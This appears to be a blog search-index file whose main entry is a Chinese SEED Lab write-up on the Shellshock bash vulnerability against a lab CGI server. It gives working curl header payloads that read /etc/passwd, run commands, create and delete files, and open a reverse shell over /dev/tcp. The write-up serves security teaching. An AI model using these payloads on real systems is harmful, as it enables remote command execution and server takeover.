<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Seedlab-Shellshock</title>
      <link href="/2022/01/23/shellshock/"/>
      <url>/2022/01/23/shellshock/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Shellshock是于2014年发现与bash相关的漏洞，漏洞原因是因为bash在解析函数变量时所调用的解析函数，会将<strong>分号</strong>隔开的语句当作指令而执行，从而造成命令执行。<br><a href="https://seedsecuritylabs.org/Labs_20.04/Software/Shellshock/">本实验原地址</a></p><h1 id="Web服务器与CGI"><a href="#Web服务器与CGI" class="headerlink" title="Web服务器与CGI"></a>Web服务器与CGI</h1><p>许多的Web服务器（Apache和nginx等）开启了CGI，来为web应用生成动态的内容。许多的CGI程序是shell脚本，所以在CGI程序运行前，Web服务器会首先fork一个新的shell程序并将HTTP请求中的一些内容设置为环境变量引入，需要用户进行HTTP请求来触发该CGI程序。<br>需要补充一点的是，CGI程序不仅可以是shell脚本，其他的一些可以接收输入的编程语言比如php等，也可以作为CGI程序来进行解析。</p><h1 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h1><h2 id="熟悉shell函数"><a href="#熟悉shell函数" class="headerlink" title="熟悉shell函数"></a>熟悉shell函数</h2><p>Ubuntu20.04中的bash程序已经被修复，无法再实施攻击。该实验在虚拟机的<mark class="hl-label blue">/bin</mark> 和压缩包的<mark class="hl-label blue">image_www</mark> 目录下安装了一个存在漏洞的bash程序。</p><h3 id="编写一个存在漏洞的shell函数"><a href="#编写一个存在漏洞的shell函数" class="headerlink" title="编写一个存在漏洞的shell函数"></a>编写一个存在漏洞的shell函数</h3><p>正常情况下shell函数的编写：<br><code>foo() &#123; echo &quot;hello world!&quot;; &#125;</code></p><mark class="hl-label red">注意：</mark> 左大括号后面的空格不能丢。<p><code>declare -f foo</code>来输出定义的函数<br>通过直接在shell中输入函数名字即可调用。<br><code>unset -f foo</code>删除定义的函数<br>另一种shell函数的编写方法：<br>上一种方法编写的shell函数如果想要传入子进程,则需要执行<code>export -f foo</code>,也就是将export的函数定义作为环境变量传入子进程。这种方法的缺点就是，父进程必须是shell程序否则无法将函数转化为环境变量引入子进程。<br>还有一种方法是定义一个特殊的变量，如<code>foo=&#39;() &#123; echo &quot;hello world!&quot;; &#125;&#39;</code>，<strong>左大括号左右间的空格不能丢掉</strong>。然后将该变量作为环境变量引入子bash进程<code>export foo</code>，子进程的shell程序会将环境变量转换为它自己的shell变量，如果在转换过程中发现有以<code>() &#123;</code>开头的环境变量时，则会将其转换为shell函数。这样只需要通过一个环境变量即可以传递函数定义。<br>定义一个存在漏洞的shell函数：<br>第二种方法在将环境变量解析为函数时会解析并执行<code>;</code>分隔的shell命令。<br><code>hack=&#39;() &#123; echo &quot;bad shell func!;&quot;&#125;;echo &quot;hacker!\n&quot;&#39;</code><strong>注意分号</strong><br><img src="https://s2.loli.net/2022/01/22/MxNuOp7ef8QKFqD.png" alt="image.png"><br>不同bash的结果如上图所示。</p><h2 id="通过环境变量向bash传入数据"><a href="#通过环境变量向bash传入数据" class="headerlink" title="通过环境变量向bash传入数据"></a>通过环境变量向bash传入数据</h2><div class="note primary simple"><p>Shellshock如果需要成功，需要满足以下两个条件：<br>1.触发bash调用<br>2.将用户输入作为环境变量</p></div><p>方便查看环境变量的CGI程序<mark class="hl-label blue">getenv.cgi</mark> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash_shellshock</span><br><span class="line"></span><br><span class="line">echo &quot;Content-type: text/plain&quot;</span><br><span class="line">echo</span><br><span class="line">echo &quot;****** Environment Variables ******&quot;</span><br><span class="line">strings /proc/$$/environ</span><br></pre></td></tr></table></figure><p><code>$$</code>会被替换为当前的进程ID</p><h3 id="使用浏览器"><a href="#使用浏览器" class="headerlink" title="使用浏览器"></a>使用浏览器</h3><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>浏览器返回内容</span></div>    <div class="hide-content"><p>****** Environment Variables ******<br>HTTP_HOST=<a href="http://www.seedlab-shellshock.com/">www.seedlab-shellshock.com</a><br>HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0<br>HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5<br>HTTP_ACCEPT_ENCODING=gzip, deflate<br>HTTP_CONNECTION=keep-alive<br>HTTP_UPGRADE_INSECURE_REQUESTS=1<br>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at <a href="http://www.seedlab-shellshock.com/">www.seedlab-shellshock.com</a> Port 80</address><br>SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)<br>SERVER_NAME=<a href="http://www.seedlab-shellshock.com/">www.seedlab-shellshock.com</a><br>SERVER_ADDR=10.9.0.80<br>SERVER_PORT=80<br>REMOTE_ADDR=10.9.0.1<br>DOCUMENT_ROOT=/var/www/html<br>REQUEST_SCHEME=http<br>CONTEXT_PREFIX=/cgi-bin/<br>CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/<br>SERVER_ADMIN=webmaster@localhost<br>SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi<br>REMOTE_PORT=45228<br>GATEWAY_INTERFACE=CGI/1.1<br>SERVER_PROTOCOL=HTTP/1.1<br>REQUEST_METHOD=GET<br>QUERY_STRING=<br>REQUEST_URI=/cgi-bin/getenv.cgi<br>SCRIPT_NAME=/cgi-bin/getenv.cgi</p></div></div><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>浏览器可传入的环境变量</span></div>    <div class="hide-content"><ul><li>HTTP_USER_AGENT</li><li>HTTP_ACCEPT</li><li>HTTP_ACCEPT_LANGUAGE</li><li>HTTP_ACCEPT_ENCODING</li><li>HTTP_HOST</li><li>HTTP_CONNECTION</li><li>HTTP_UPGRADE_INSECURE_REQUESTS</li></ul></div></div><h3 id="使用curl"><a href="#使用curl" class="headerlink" title="使用curl"></a>使用curl</h3><ul><li><code>-A</code>改变User-Agent字段</li><li><code>-e</code>改变Referer字段</li><li><code>-H</code>自定义头部，无值<code>Extra-Header;</code>,有值<code>Extra-Header: value</code><br>上面的三个选项均可以用来向环境变量中注入数据。<h2 id="发起攻击"><a href="#发起攻击" class="headerlink" title="发起攻击"></a>发起攻击</h2>目标URL：<a href="http://www.seedlab-shellshock.com/cgi-bin/vul.cgi">http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</a><br>如果攻击命令执行结果是一个纯文本输出，并且我们想要该结果返回，则需要满足该协议：首先要以<code>echo &quot;Content-type: text/plain&quot;;</code>开头，后面跟随着一个空白行<code>echo;</code>，最后是我们想要执行的指令。<br>比如：<code>echo &quot;Content-type: text/plain&quot;;echo;/bin/ls -l</code><h3 id="服务器返回-etc-passwd的内容"><a href="#服务器返回-etc-passwd的内容" class="headerlink" title="服务器返回/etc/passwd的内容"></a>服务器返回/etc/passwd的内容</h3>使用-H选项来进行攻击<br><code>curl -v -H &#39;shArp: () &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/cat /etc/passwd&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi </code><h3 id="服务器返回当前的User-ID"><a href="#服务器返回当前的User-ID" class="headerlink" title="服务器返回当前的User ID"></a>服务器返回当前的User ID</h3>使用-H选项来进行攻击<br><code>curl -v -H &#39;shArp: () &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/id&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi </code><h3 id="在-tmp目录下创建新的文件"><a href="#在-tmp目录下创建新的文件" class="headerlink" title="在/tmp目录下创建新的文件"></a>在/tmp目录下创建新的文件</h3>使用-A选项<br><code>curl -v -A &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/touch /tmp/sharp&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code><br>查看创建的文件：<br><code>curl -v -A &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/ls /tmp -l&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></li></ul><mark class="hl-label red">注意：</mark> 一次只能执行一个命令<h3 id="删除创建的文件"><a href="#删除创建的文件" class="headerlink" title="删除创建的文件"></a>删除创建的文件</h3><p>使用-e选项<br><code>curl -v -e &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/rm /tmp/sharp&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><h3 id="问题回答"><a href="#问题回答" class="headerlink" title="问题回答"></a>问题回答</h3><p>1.不能读取/ect/shadow文件，因为只有root用户以及处于shadow用户组的用户才有读取权限<br>2.不可以（对于我来说）通过在GET请求的数据部分插入代码，这是因为<code>?</code>后面只能跟连续的字符串。curl中?后面加上空格会显示<strong>bad request</strong>,而进行一些编码等处理后会原封不动的赋值给环境变量，从而无法成功的进行解析。</p><h2 id="通过Shellshock创建反向shell"><a href="#通过Shellshock创建反向shell" class="headerlink" title="通过Shellshock创建反向shell"></a>通过Shellshock创建反向shell</h2><p>在发现服务器存在任意命令执行漏洞后，为了我们进一步的攻击往往需要创建一个交互式的shell。反向shell的原理在这里就不在说明。<br><code>curl -v -e &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code><br>最终成功的反弹了一个shell<br><img src="https://s2.loli.net/2022/01/23/HgPU8qkNlaI3KA9.png" alt="image.png"><br>作者在这里是直接反弹到了本地虚拟机的ens33端口，由于docker的网络配置其他IP地址可能不会成功反弹shell。</p><h2 id="使用打过补丁的Bash"><a href="#使用打过补丁的Bash" class="headerlink" title="使用打过补丁的Bash"></a>使用打过补丁的Bash</h2><p>修复之后的Bash会直接将函数后面的内容忽略掉，所以不会成功的执行上面命令。具体操作不再展示。</p><h2 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h2><p>对于Linux操作系统来说任何对象均为文件，建立的TCP连接也是一样的，不同编程语言版本的反向shell都是将标准输入、输出的文件描述符重定向到TCP连接的文件描述符从而实现远程控制。</p><h1 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h1><h2 id="curl发送的编码问题"><a href="#curl发送的编码问题" class="headerlink" title="curl发送的编码问题"></a>curl发送的编码问题</h2><p>在GET请求的数据部分发送POC时大括号会消失:<br>原请求<code>curl -v &#39;http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?()+&#123;+echo+&quot;hello&quot;;+&#125;;+echo+&quot;Content-type:+text/plain&quot;;+echo;/bin/ls+/etc/shadow+-l&#39;</code><br>返回的内容<code>QUERY_STRING=()++echo+&quot;hello&quot;;+;+echo+&quot;Content-type:+text/plain&quot;;+echo;/bin/ls+/etc/shadow+-l</code><br>需要使用转义符号<code>\</code>进行转义。<br>GET请求中的一些特殊字符比如空格等，需要进行编码之后进行发送。<br>POST请求如果带有特殊字符可以使用<code>--data-urlencode</code>进行编码或者使用转义字符。</p>]]></content>
      
      
      <categories>
          
          <category> 国外课程 </category>
          
          <category> seedlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> bash </tag>
            
            <tag> CGI </tag>
            
            <tag> curl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello</title>
      <link href="/2022/01/22/Hello/"/>
      <url>/2022/01/22/Hello/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>互联网上的小伙伴们，大家好！<br>这是我的第一个博客，在这里会记录我的学习过程。<br>希望里面的文章会对你有所帮助!</p><div class="note success modern"><p>Keep Learning!</p></div>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>music</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>movies</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友情链接</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
